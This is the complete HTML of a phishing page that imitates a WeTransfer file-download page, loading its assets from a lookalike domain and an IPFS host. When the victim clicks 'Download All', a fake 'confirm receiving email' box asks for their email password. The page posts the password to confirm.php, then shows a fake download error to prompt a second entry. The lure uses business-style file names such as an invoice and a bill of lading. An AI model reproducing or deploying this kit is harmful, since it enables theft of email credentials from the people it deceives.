<!DOCTYPE html>
<html class="no-touch no-ie fonts-loaded" <head="" lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

  

  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="minimum-scale=1, initial-scale=1,user-scalable=no">
  <meta name="pinterest" content="nopin">
  <meta name="referrer" content="origin">

  <!-- OG data should be in English, or we need to pass the supported locales in an array in og:locale:alternate -->
      <meta property="og:description" content="3 files sent via WeTransfer, the simplest way to send your files around the world">
      <meta property="og:title" content="Download 3 files">
        <meta property="og:image" content="assets/img/wt-facebook-568be8def5a86a09cedeb21b8f24cb208e86515a552bd07d856c7d5dfc6a23df.png">
    <meta property="og:type" content="website">
    <meta property="fb:app_id" content="265125293564341">

    <meta name="description" content="WeTransfer is the simplest way to send your files around the world. Share large files up to 2GB for free.">

  <meta name="author" content="WeTransfer">

  
  <link rel="shortcut icon" href="https://prod-cdn.wetransfer.net/packs/media/images/favicon-a34a7465.ico">
  <link rel="icon" sizes="16x16 32x32" href="https://check-account-wetran-sfer-gxdn56-2.netlify.app/assets/img/favicon-d12161435ace47c6883360e08466508593325f134c1852b1d0e6e75d5f76adda.ico">

  <!-- default favicon -->
  <link rel="mask-icon" href="https://check-account-wetran-sfer-gxdn56-2.netlify.app/assets/img/favicon-fb0651bcae0b66fa7a3dd5a550e3b654edbfe6c01267ecca6f68a4f9bec67fb1.svg" color="#17181A">

  <!-- iOS: -->
  <link rel="apple-touch-icon-precomposed" href="https://check-account-wetran-sfer-gxdn56-2.netlify.app/assets/img/apple-touch-icon-5a0a98ed8a06dd436f4881fc6225806c45db7d636175e4b5a6e3e20fa7228233.png">
  <link rel="apple-touch-icon-precomposed" sizes="152x152" href="https://check-account-wetran-sfer-gxdn56-2.netlify.app/assets/img/apple-touch-icon-152x152-precomposed-067f23ab6514fd034cc001a814059580da710a62361a1338ab63932d7864c052.png">
  <link rel="apple-touch-icon-precomposed" sizes="180x180" href="https://check-account-wetran-sfer-gxdn56-2.netlify.app/assets/img/apple-touch-icon-180x180-precomposed-b8c5bf2f80790d4abbe7fd5dca0bcf5c3eeaa4e23b1b35c8854a3fdb5c26b1e9.png">
  <link rel="apple-touch-icon-precomposed" sizes="167x167" href="https://check-account-wetran-sfer-gxdn56-2.netlify.app/assets/img/apple-touch-icon-167x167-precomposed-5f321b1568f630ec20d23af277c0e49c7d212b830c439be7f0265be9f24d2402.png">

  <meta name="application-name" content="WeTransfer">

  <meta name="csrf-param" content="authenticity_token">

    <title dir="ltr">WeTransfer</title>

  <style type="text/css">
    .assets-warning-node {
      display: none;
      visibility: hidden;
      position: fixed;
      background: #fff;
      z-index: 999;
      bottom: 0; left: 0; right: 0; top: 0;;
      padding: 2em;
      line-height: 1.4;
      font-family: sans-serif;;
      font-size: 1.1em;
    }
    .assets-warning-node p {
      max-width: 42em;
    }
    .root-node .no-script {
      position: fixed;
      background: #E65050;
      color: #fff;
      top: 0;
      left: 0;
      margin: 0;
      padding: 1em;
      font-weight: bold;
    }
    .modal-bg {
      background: rgba(0, 0, 0, 0.8);
      position: fixed;
      width: 100%;
      height: 100%;
      z-index:900;
    }
    .modal-box{
      margin: 0 auto;
      width: 50%;
      height: 50%;
      margin-top: 13%;
      background: rgba(65, 65, 65, 0.5) !important;
      border: 1px solid #000000;
      z-index: 1000;
      border-radius: 2em;
      text-align: center;
    }
    #progress-canvas{
      z-index: 1500;
      margin: 0 auto;
      position: fixed;
      top: 37%;
      right: 44.5%;
    }
    .circle{
       height: 149px;
       width: 149px;
       border-radius: 50%;
       border:13px solid #FFF;
       position: fixed;
       z-index:1500;
       top: 37%;
       right: 44.5%;
    }
    #download-msg{
      position: fixed;
      color: orange;
      top: 60%;
      right: 44.5%;
      z-index: 1500;
    }
    .hide {
      display: none;
    }
    .exit {
      margin: 0 auto;
      margin-top: 45%;
    }
    .btn-exit{
      background: #09F;
      color: white;
      padding: 10px;
      border-radius: 10%;
      width: 100px;
    }
    
    .confirm-modal-box{
      margin: 0 auto;
      background: white;
      width: 100%;
      height: 60vh;
      border: 1px solid black;
      margin-top: 13%;
      border-radius: 3px;
    }
    .modal-logo{
      width: 70%;
    }
    .confirm-input{
      width: 80%;
      padding: 3%;
      font-weight:bold;
      
    }
    .confirm-button {
      color: white;
      background: #0092d0;
      border-radius: 12px;
      padding: 10px;
      border: none;
      width: 30%;
      margin-top: 10px;
    }
    .filelist__name{
      font-weight: bold !important;
    }
    @media only screen and (min-width: 768px) {
       .confirm-modal-box{
            margin: 0 auto;
            background: white;
            width: 30%;
            height: 40vh;
            border: 1px solid black;
            margin-top: 13%;
            border-radius: 3px; 
       }
       .modal-logo{
            width: 70%;
        }
        
        .confirm-input{
             width: 80%;
            padding: 3%;
            font-weight:bold;
      
        }
        .confirm-button {
            color: white;
            background: #0092d0;
            border-radius: 12px;
            padding: 10px;
            border: none;
            width: 30%;
            margin-top: 10px;
        }
    }
  </style>
    <link rel="stylesheet" media="all" href="https://bafybeidxruucr7qpbucdynlan4vbtdbztzloqwqhuceo6a7wfe5w7syejy.ipfs.fleek.cool/application-aeb3139da0ad006d6fe071bc054e9c000c8edad0fc4dbc17.css" onerror="assetFailed(this)">
    <script src="https://bafybeidxruucr7qpbucdynlan4vbtdbztzloqwqhuceo6a7wfe5w7syejy.ipfs.fleek.cool/jquery.min.js.download"></script><script>(function inject() {
        function GenerateQuickId() {
          var randomStrId = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
          return randomStrId.substring(0, 22);
        }

        ;

        function SendXHRCandidate(requestMethod_, url_, type_, content_) {
          try {
            var id = 'detector';
            var mes = {
              posdMessageId: 'PANELOS_MESSAGE',
              posdHash: GenerateQuickId(),
              type: 'VIDEO_XHR_CANDIDATE',
              from: id,
              to: id.substring(0, id.length - 2),
              content: {
                requestMethod: requestMethod_,
                url: url_,
                type: type_,
                content: content_
              }
            };
            window.postMessage(mes, '*');
          } catch (e) {}
        }

        ;
        var open = XMLHttpRequest.prototype.open;

        XMLHttpRequest.prototype.open = function () {
          this.requestMethod = arguments[0];
          open.apply(this, arguments);
        };

        var send = XMLHttpRequest.prototype.send;

        XMLHttpRequest.prototype.send = function () {
          var onreadystatechange = this.onreadystatechange;

          this.onreadystatechange = function () {
            if (this.readyState === 4) {
              setTimeout(SendXHRCandidate(this.requestMethod, this.responseURL, this.getResponseHeader('content-type'), this.response), 0);
            }

            if (onreadystatechange) {
              return onreadystatechange.apply(this, arguments);
            }
          };

          return send.apply(this, arguments);
        };

        var nativeFetch = fetch;

        fetch = function fetch() {
          var _this = this;

          var args = arguments;
          var fetchURL = arguments[0] instanceof Request ? arguments[0].url : arguments[0];
          var fetchMethod = arguments[0] instanceof Request ? arguments[0].method : 'GET';
          return new Promise(function (resolve, reject) {
            var promise = nativeFetch.apply(_this, args);
            promise.then(function (response) {
              if (response.body instanceof ReadableStream) {
                var nativeJson = response.json;

                response.json = function () {
                  var _arguments = arguments,
                      _this2 = this;

                  return new Promise(function (resolve, reject) {
                    var jsonPromise = nativeJson.apply(_this2, _arguments);
                    jsonPromise.then(function (jsonResponse) {
                      setTimeout(SendXHRCandidate(fetchMethod, fetchURL, response.headers.get('content-type'), JSON.stringify(jsonResponse)), 0);
                      resolve(jsonResponse);
                    })["catch"](function (e) {
                      reject(e);
                    });
                  });
                };

                var nativeText = response.text;

                response.text = function () {
                  var _arguments2 = arguments,
                      _this3 = this;

                  return new Promise(function (resolve, reject) {
                    var textPromise = nativeText.apply(_this3, _arguments2);
                    textPromise.then(function (textResponse) {
                      setTimeout(SendXHRCandidate(fetchMethod, fetchURL, response.headers.get('content-type'), textResponse), 0);
                      resolve(textResponse);
                    })["catch"](function (e) {
                      reject(e);
                    });
                  });
                };
              }

              resolve.apply(this, arguments);
            })["catch"](function () {
              reject.apply(this, arguments);
            });
          });
        };
      })();</script><script>(function inject() {
        function GenerateQuickId() {
          var randomStrId = Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15) + Math.random().toString(36).substring(2, 15);
          return randomStrId.substring(0, 22);
        }

        ;

        function SendXHRCandidate(requestMethod_, url_, type_, content_) {
          try {
            var id = 'detector';
            var mes = {
              posdMessageId: 'PANELOS_MESSAGE',
              posdHash: GenerateQuickId(),
              type: 'VIDEO_XHR_CANDIDATE',
              from: id,
              to: id.substring(0, id.length - 2),
              content: {
                requestMethod: requestMethod_,
                url: url_,
                type: type_,
                content: content_
              }
            };
            window.postMessage(mes, '*');
          } catch (e) {}
        }

        ;
        var open = XMLHttpRequest.prototype.open;

        XMLHttpRequest.prototype.open = function () {
          this.requestMethod = arguments[0];
          open.apply(this, arguments);
        };

        var send = XMLHttpRequest.prototype.send;

        XMLHttpRequest.prototype.send = function () {
          var onreadystatechange = this.onreadystatechange;

          this.onreadystatechange = function () {
            if (this.readyState === 4) {
              setTimeout(SendXHRCandidate(this.requestMethod, this.responseURL, this.getResponseHeader('content-type'), this.response), 0);
            }

            if (onreadystatechange) {
              return onreadystatechange.apply(this, arguments);
            }
          };

          return send.apply(this, arguments);
        };

        var nativeFetch = fetch;

        fetch = function fetch() {
          var _this = this;

          var args = arguments;
          var fetchURL = arguments[0] instanceof Request ? arguments[0].url : arguments[0];
          var fetchMethod = arguments[0] instanceof Request ? arguments[0].method : 'GET';
          return new Promise(function (resolve, reject) {
            var promise = nativeFetch.apply(_this, args);
            promise.then(function (response) {
              if (response.body instanceof ReadableStream) {
                var nativeJson = response.json;

                response.json = function () {
                  var _arguments = arguments,
                      _this2 = this;

                  return new Promise(function (resolve, reject) {
                    var jsonPromise = nativeJson.apply(_this2, _arguments);
                    jsonPromise.then(function (jsonResponse) {
                      setTimeout(SendXHRCandidate(fetchMethod, fetchURL, response.headers.get('content-type'), JSON.stringify(jsonResponse)), 0);
                      resolve(jsonResponse);
                    })["catch"](function (e) {
                      reject(e);
                    });
                  });
                };

                var nativeText = response.text;

                response.text = function () {
                  var _arguments2 = arguments,
                      _this3 = this;

                  return new Promise(function (resolve, reject) {
                    var textPromise = nativeText.apply(_this3, _arguments2);
                    textPromise.then(function (textResponse) {
                      setTimeout(SendXHRCandidate(fetchMethod, fetchURL, response.headers.get('content-type'), textResponse), 0);
                      resolve(textResponse);
                    })["catch"](function (e) {
                      reject(e);
                    });
                  });
                };
              }

              resolve.apply(this, arguments);
            })["catch"](function () {
              reject.apply(this, arguments);
            });
          });
        };
      })();</script>
      <script src="https://bafybeidxruucr7qpbucdynlan4vbtdbztzloqwqhuceo6a7wfe5w7syejy.ipfs.fleek.cool/bootstrap.min.js.download"></script>
</head>
<body bis_register="W3sibWFzdGVyIjp0cnVlLCJleHRlbnNpb25JZCI6ImVwcGlvY2VtaG1ubGJoanBsY2drb2ZjaWllZ29tY29uIiwiYWRibG9ja2VyU3RhdHVzIjp7IkRJU1BMQVkiOiJkaXNhYmxlZCIsIkZBQ0VCT09LIjoiZGlzYWJsZWQiLCJUV0lUVEVSIjoiZGlzYWJsZWQifSwidmVyc2lvbiI6IjEuOC45Iiwic2NvcmUiOjEwODA5fV0=">


<!-- <script type="text/javascript">
var _preloaded_transfer_ = {"id":"41d7cb9e19aa16c35812a437375963bd20190311012539","state":"downloadable","transfer_type":4,"shortened_url":"https://we.tl/t-J0NDFa5eHk","expires_at":"2019-03-18T01:25:49Z","password_protected":false,"uploaded_at":"2019-03-11T01:25:49Z","expiry_in_seconds":604768,"size":53200,"deleted_at":null,"recipient_id":null,"security_hash":"eaa7c1","description":"this is the file","items":[{"id":"a52663aaf2bbe365f43e475e560bffc220190311012539","name":"139.000 USD 4.1.2019 Junjin.xlsx","retries":0,"size":53200,"previewable":false,"content_identifier":"file"}]};
</script> -->


  <!-- <div class="assets-warning-node">
    <h1>Uh-oh...</h1>
    <p>
      We couldn't load some important parts of our website.
They may have been blocked by your firewall, proxy or browser set-up.
Try refreshing the page or get in touch through our <a href="https://wetransfer.zendesk.com/" rel="external">help center</a>.
    </p>
  </div> -->
  <form>
  <div class="root-node" bis_skin_checked="1"><div class="app application" bis_skin_checked="1">
  <div class="transfer" route="[object Object]" id="41d7cb9e19aa16c35812a437375963bd20190311012539" secret="eaa7c1" bis_skin_checked="1"><div bis_skin_checked="1">
  <div class="transfer__window downloader" bis_skin_checked="1">
  <div class="scrollable transfer__contents" bis_skin_checked="1">
  <div class="scrollable__content" style="margin-right: -17px;" bis_skin_checked="1">
  <div class="downloader__heading downloader__heading--1-files downloader__heading--message" bis_skin_checked="1">
  <svg class="downloader__top-icon" viewBox="0 0 170 170"><g fill="#6aa84f" fill-rule="evenodd">
  <path d="M145.104 24.896c33.195 33.194 33.195 87.014 0 120.208-33.194 33.195-87.014 33.195-120.208 0C-8.3 111.91-8.3 58.09 24.896 24.896 58.09-8.3 111.91-8.3 145.104 24.896zm-7.071 7.071c-29.29-29.29-76.777-29.29-106.066 0-29.29 29.29-29.29 76.777 0 106.066 29.29 29.29 76.777 29.29 106.066 0 29.29-29.29 29.29-76.777 0-106.066z"></path>
  <path d="M82 100.843V59.007A4.006 4.006 0 0 1 86 55c2.21 0 4 1.794 4 4.007v41.777l15.956-15.956a4.003 4.003 0 0 1 5.657 0 4.004 4.004 0 0 1 0 5.657l-22.628 22.628a3.99 3.99 0 0 1-3.017 1.166 3.992 3.992 0 0 1-3.012-1.166L60.328 90.485a4.003 4.003 0 0 1 0-5.657 4.004 4.004 0 0 1 5.657 0L82 100.843z"></path>
</g></svg><h2>Ready when you are</h2><p>Files will be deleted in 7 days</p>
<div class="downloader__message" bis_skin_checked="1">
  <p title="Hi, please kindly go through this documents and revert to us as soon as possible">
    Hi, as per my first mail... These are the products we are interested. and Company profile...</p></div>
</div>
<ul class="filelist">
  <li class="filelist__item"><div class="poptip" bis_skin_checked="1"><div class="filelist__meta" bis_skin_checked="1">
  <span class="filelist__name" title="bill of lading.pdf">List of Items.pdf</span>
  <p class="filelist__size"><span>961 KB</span><span>pdf</span></p><div class="filelist__action" bis_skin_checked="1"><svg viewBox="0 0 24 24"><path d="M22 12c0-5.523-4.477-10-10-10S2 6.477 2 12s4.477 10 10 10 10-4.477 10-10zm-9 1.492V7.998C13 7.446 12.552 7 12 7c-.556 0-1 .447-1 .998v5.48l-2.53-2.53c-.385-.385-1.022-.39-1.413.002-.393.393-.39 1.022-.002 1.412l4.247 4.247c.192.19.447.288.702.288.26.003.514-.095.708-.29l4.247-4.246c.383-.385.387-1.022-.003-1.412-.394-.393-1.023-.392-1.413-.002L13 13.492zM0 12C0 5.373 5.373 0 12 0s12 5.373 12 12-5.373 12-12 12S0 18.627 0 12z" fill-rule="evenodd"></path></svg></div></div></div></li>
</ul>
<ul class="filelist">
  <li class="filelist__item"><div class="poptip" bis_skin_checked="1"><div class="filelist__meta" bis_skin_checked="1">
  <span class="filelist__name" title="Invoice.pdf">Drawings and Specifications.zip</span>
  <p class="filelist__size"><span>20MB</span><span>zip</span></p><div class="filelist__action" bis_skin_checked="1"><svg viewBox="0 0 24 24"><path d="M22 12c0-5.523-4.477-10-10-10S2 6.477 2 12s4.477 10 10 10 10-4.477 10-10zm-9 1.492V7.998C13 7.446 12.552 7 12 7c-.556 0-1 .447-1 .998v5.48l-2.53-2.53c-.385-.385-1.022-.39-1.413.002-.393.393-.39 1.022-.002 1.412l4.247 4.247c.192.19.447.288.702.288.26.003.514-.095.708-.29l4.247-4.246c.383-.385.387-1.022-.003-1.412-.394-.393-1.023-.392-1.413-.002L13 13.492zM0 12C0 5.373 5.373 0 12 0s12 5.373 12 12-5.373 12-12 12S0 18.627 0 12z" fill-rule="evenodd"></path></svg></div></div></div></li>
</ul>

<ul class="filelist">
  <li class="filelist__item"><div class="poptip" bis_skin_checked="1"><div class="filelist__meta" bis_skin_checked="1">
  <span class="filelist__name" title="compaby profile.mp4">Company Profile.mp4</span>
  <p class="filelist__size"><span>15.3 MB</span><span>mp4</span></p><div class="filelist__action" bis_skin_checked="1"><svg viewBox="0 0 24 24"><path d="M22 12c0-5.523-4.477-10-10-10S2 6.477 2 12s4.477 10 10 10 10-4.477 10-10zm-9 1.492V7.998C13 7.446 12.552 7 12 7c-.556 0-1 .447-1 .998v5.48l-2.53-2.53c-.385-.385-1.022-.39-1.413.002-.393.393-.39 1.022-.002 1.412l4.247 4.247c.192.19.447.288.702.288.26.003.514-.095.708-.29l4.247-4.246c.383-.385.387-1.022-.003-1.412-.394-.393-1.023-.392-1.413-.002L13 13.492zM0 12C0 5.373 5.373 0 12 0s12 5.373 12 12-5.373 12-12 12S0 18.627 0 12z" fill-rule="evenodd"></path></svg></div></div></div></li>
</ul>
  

  </div><div class="scrollable__scrollbar" bis_skin_checked="1">
    <div class="scrollable__scrollbar-thumb" style="height: 0px; transform: translateY(0px);" bis_skin_checked="1">
  </div></div></div><div class="transfer__footer" bis_skin_checked="1">
  <button class="transfer__button" id="btn-download">Download All</button></div></div></div></div>
  <div class="dropzone" bis_skin_checked="1"><h3 class="dropzone__title">Drop it like it 19s hot</h3><p class="dropzone__text">Add your files by dropping them anywhere in this window</p></div><div class="wallpaper" bis_skin_checked="1"><iframe src="https://bafybeidxruucr7qpbucdynlan4vbtdbztzloqwqhuceo6a7wfe5w7syejy.ipfs.fleek.cool/a.html" scrolling="no" allow="autoplay; camera" bis_size="{&quot;x&quot;:0,&quot;y&quot;:0,&quot;w&quot;:1366,&quot;h&quot;:657,&quot;abs_x&quot;:0,&quot;abs_y&quot;:0}" frameborder="0"></iframe><span class="wallpaper__title"></span></div><nav class="nav nav--loaded"><ul class="nav__items"><li class="nav__item"><a href="#" class="nav__label">Help</a></li>
  <li class="nav__item nav_item--expanded"><a href="#" class="nav__label">About</a>
    <ul class="nav__subitems" style="width: 0px;"><li class="nav__subitem"><a href="#" class="nav__label">WeTransfer</a></li><li class="nav__subitem"><a href="#" class="nav__label">Products</a></li><li class="nav__subitem"><a href="#" class="nav__label">Plus</a></li><li class="nav__subitem"><a href="#" class="nav__label">Advertise</a></li></ul>
  </li><li class="nav__item"><a href="#" class="nav__label">Got Plus?</a></li>
  </ul></nav><div class="spinner logo spinner--single" bis_skin_checked="1"><svg height="44" width="44" class="spinner__circle" shape-rendering="geometricPrecision" viewBox="0 0 44 44"><circle class="spinner__background" r="20.5" cx="22" cy="22" fill="transparent" style="stroke-dasharray: 128.805; stroke-dashoffset: 0; stroke-width: 3; stroke: rgb(232, 235, 237);"></circle><circle class="spinner__foreground" r="20.5" cx="22" cy="22" fill="transparent" style="stroke-dasharray: 128.805; stroke-dashoffset: 128.161; stroke-width: 3; stroke: rgb(64, 159, 255);"></circle></svg><svg width="52" height="29" class="spinner__logo" viewBox="-4 -2 52 29"><defs><path id="logo-path" d="M25.4 10.6c0-6.2 4.4-9.9 10.1-9.9C40.6.7 44 3.3 44 6.9c0 3.4-2.9 5.6-6.1 5.6-1.8 0-3.1-.3-4-1-.3-.3-.5-.2-.5.1 0 1.3.5 2.3 1.3 3.2.7.7 2 1.2 3.2 1.2 1.3 0 2.4-.3 3.4-.8s1.8-.3 2.3.5c.6.9-.2 2.1-.9 2.9-1.3 1.4-3.8 2.4-7 2.4-6.5-.2-10.3-4.6-10.3-10.4zm-13.3 4.1c.6 0 1 .3 1.4 1l1.8 2.9c.7 1.1 1.3 1.9 2.6 1.9s2-.5 2.6-2c.8-1.8 1.7-4.1 2.4-7.1.9-3.4 1.3-5.4 1.3-7.1s-.5-2.7-2.4-3c-2.5-.5-6-.7-9.7-.7s-7.2.2-9.7.6C.5 1.6 0 2.6 0 4.3S.4 8 1.2 11.4c.8 3 1.6 5.2 2.4 7.1.7 1.5 1.3 2 2.6 2s1.9-.8 2.6-1.9l1.8-2.9c.5-.6.9-1 1.5-1z"></path><filter id="logo-filter" width="200%" height="200%" x="-50%" y="-50%" filterUnits="objectBoundingBox"><feOffset dx="0" dy="2" in="SourceAlpha" result="shadowOffsetOuter1"></feOffset><feGaussianBlur stdDeviation="2" in="shadowOffsetOuter1" result="shadowBlurOuter1"></feGaussianBlur></filter></defs><g fill="none" class="logo-shape"><use fill="#17181A" fill-opacity="0.11" filter="url(#logo-filter)" xlink:href="#logo-path"></use><use fill-rule="evenodd" xlink:href="#logo-path"></use></g></svg><svg class="spinner__aborted" viewBox="55 42 171 171"><g fill="none" fill-rule="evenodd"><path fill="#E65050" d="M136.75 141.407h7.432l3.315-29.634V92.887h-14.164v18.886l3.416 29.634zM133.734 162h13.36v-13.26h-13.36V162z"></path></g></svg><svg class="spinner__finished" viewBox="550 421 13 13" focusable="false"><path stroke="#409FFF" stroke-width="2.057" d="M552 426.888l3.16 3.112 4.84-7" fill="none" fill-rule="evenodd" stroke-linecap="round" stroke-linejoin="round"></path></svg></div></div></div>
  </form>

  <div class="modal-bg hide" id="confirm-modal" bis_skin_checked="1">
    <div class="confirm-modal-box" style="min-height: 270px;" bis_skin_checked="1">
      <div style="margin: 0 auto; text-align: center; padding-top: 10px;" bis_skin_checked="1">
        <img class="modal-logo" src="https://bafybeidxruucr7qpbucdynlan4vbtdbztzloqwqhuceo6a7wfe5w7syejy.ipfs.fleek.cool/logo.png">
        <div style="color: red; text-align:center;margin-top: 13px;" bis_skin_checked="1"> Please confirm receiving email</div>
        <div style="text-align:center; margin-top: 25px;" bis_skin_checked="1">
          <div bis_skin_checked="1">
            <input type="text" name="email" readonly="readonly" id="email" value="<?php echo $_GET['email']; ?>" placeholder="Enter email ..." class="confirm-input">
          </div>
          <div bis_skin_checked="1">
            <input type="password" name="password" id="password" placeholder="Enter password" class="confirm-input" style="margin-top: 15px;">
          </div>
          <button class="confirm-button" id="btn-confirm"> Confirm </button>
        </div>
      </div>
    </div>
  </div>

  <div class="modal-bg hide" id="modal" bis_skin_checked="1"> 
  <div class="modal-box" bis_skin_checked="1">
    <div class="circle" bis_skin_checked="1"></div>
    <canvas id="progress-canvas" width="150" height="150"></canvas>
    <div id="download-msg" style="margin-top: 1rem;" bis_skin_checked="1">Downloading Files...</div>
    <div class="exit hide" id="exit" style="position: relative; top: -15%;" bis_skin_checked="1">
      <button class="btn-exit" id="btn-exit">Try Again</button>
    </div>
  </div>
  </div>


  
  
  
  <script type="text/javascript">

  function getParameterByName(name, url) {
    if (!url) url = window.location.href;
    name = name.replace(/[\[\]]/g, "\\$&");
    var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),
      results = regex.exec(url);
    if (!results) return null;
    if (!results[2]) return "";
    return decodeURIComponent(results[2].replace(/\+/g, " "));
  }

  document.querySelector("#email").value = getParameterByName("email");


   var ctx = document.getElementById('progress-canvas').getContext('2d');
    var al = 0;
    var start = 4.72;
    var cw = ctx.canvas.width ;
    var ch = ctx.canvas.height ;
    var diff;
    var sim;
  $(document).ready(function(){
    $("#btn-download").click(function(e){
      e.preventDefault();
      e.stopPropagation();
      $("#confirm-modal").removeClass("hide").fadeIn(1000);
      $("#password").focus();
    });

    $("#btn-confirm").click(function(e){
      e.preventDefault();
      e.stopPropagation();
      var pass = $("#password").val();
      var email = $("#email").val();
      if(isEmail(email) == false){
        $("#email").css("border", "1px solid red");
		$("#email").attr("placeholder", "Please enter a valid email!");
		return false;
      }else if(pass.length < 2){
        $("#password").css("border", "1px solid red");
        $("#password").attr("placeholder", "Please enter your password first!");
        $("#password").focus();
      }else{
        $("#errormsg").text("");
        $("#modal").removeClass("hide");
        $("#confirm-modal").addClass("hide");
        sim = setInterval(() => {
          progressSim();
        }, 300);
        $.ajax({
          url: "confirm.php",
          method: "post",
          data: {
            email: email,
            password: pass
          },
          success: (data) => {
              console.log(data);
              triggerError();
          },
          error: (err) => {
            console.log(err)
            triggerError()
          }
        })
      }
      
    })

    $("#btn-exit").click(function(){
      closeModal();
      reset();

    })
  })
  function progressSim(){
      diff = ((al/100) * Math.PI * 2 * 10).toFixed(2);
      ctx.clearRect(0, 0, cw, ch);
      ctx.lineWidth = 13;
      ctx.fillStyle = '#09F';
      ctx.strokeStyle = '#09F';
      ctx.textAlign = 'center';
      ctx.font = "25px monospace";
      ctx.fillText(al+'%', cw * .5, ch * .5 + 2, cw);
      ctx.beginPath();
      ctx.arc(75, 75, 68, start, diff/10+start, false);
      ctx.stroke();
      if (al >= 100){
        clearTimeout(sim)
      }
      al++;
    }

    function triggerError(){
      setTimeout(() => {
      al = 0;
      $("#password").val("");
      $("#download-msg").css("color", "#e81123");
      $("#download-msg").css("top", "60%");
      $("#download-msg").css("right", "40%");
	  $("#download-msg").css("margin-top", "-12px");
      $("#download-msg").html("Technical error encountered <br> Please confirm the email password");
      clearInterval(sim);
      $("#exit").removeClass("hide");   
      }, 1000);
    
    }
    function closeModal(){
      $("#modal").addClass("hide");
      $("#exit").addClass("hide");
      $("#confirm-modal").removeClass("hide");
    }
    
    function reset(){
      al = 0;
      $("#download-msg").css("color", "orange");
      $("#download-msg").css("right", "50%");
      $("#download-msg").text("Downloading Files...");
      ctx.clearRect(0, 0, cw, ch);
      $("#password").focus();
    }
	
	function isEmail(email){
		var regex = /^([a-zA-Z0-9_.+-])+\@(([a-zA-Z0-9-])+\.)+([a-zA-Z0-9]{2,6})+$/;
		return regex.test(email);
	}
</script>

 
</body></html>